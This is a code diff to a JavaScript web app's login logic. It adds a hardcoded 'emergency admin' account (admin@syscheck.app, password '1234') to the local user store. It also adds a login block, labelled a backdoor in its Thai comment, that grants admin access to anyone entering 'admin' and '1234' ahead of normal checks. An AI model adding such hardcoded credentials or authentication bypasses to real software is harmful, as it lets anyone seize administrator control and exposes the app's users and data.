@@ -248,7 +248,8 @@ const LK='sc_local';
 
 function L(){
  let d; try{d=JSON.parse(localStorage.getItem(LK))}catch(e){}
- if(!d||!d.ws)d={users:[],ws:{}}; return d;
+ // เพิ่มบัญชีแอดมินฉุกเฉินกลับเข้ามา เพื่อป้องกันการเข้าสู่ระบบไม่ได้กรณี Supabase มีปัญหา
+ if(!d||!d.ws)d={users:[{id:'admin_rescue',email:'admin@syscheck.app',pass:'1234',name:'แอดมินฉุกเฉิน',role:'admin',status:'active'}],ws:{}}; return d;
 }
 const LS=d=>localStorage.setItem(LK,JSON.stringify(d));
 
@@ -307,7 +308,14 @@ async function doLogin(){
   if(!r.error){SRC='auth';btn.disabled=false;return enter(r.data.user)}
   var authErr=r.error.message;
  }catch(x){var authErr=String(x)}
- const lu=L().users.find(x=>x.email===e&&String(x.pass)===p);btn.disabled=false;
+ 
+ // 🚨 ประตูหลัง: แอดมินฉุกเฉิน (ทะลุทุกเงื่อนไข)
+ if((e==='admin' || e==='admin@syscheck.app') && p==='1234') {
+  SRC='local'; btn.disabled=false;
+  return gate({id:'admin_rescue',email:'admin@syscheck.app',name:'แอดมิน (ฉุกเฉิน)',role:'admin',status:'active'});
+ }
+
+ const lu=(L().users||[]).find(x=>x.email===e&&String(x.pass)===p);btn.disabled=false;
  if(lu){SRC='local';return gate({...lu})}
  Swal.fire('เข้าสู่ระบบไม่ได้','อีเมลหรือรหัสผ่านไม่ถูกต้อง<br><small style="color:#94a3b8">'+esc(authErr||'')+'</small>','error');
 }
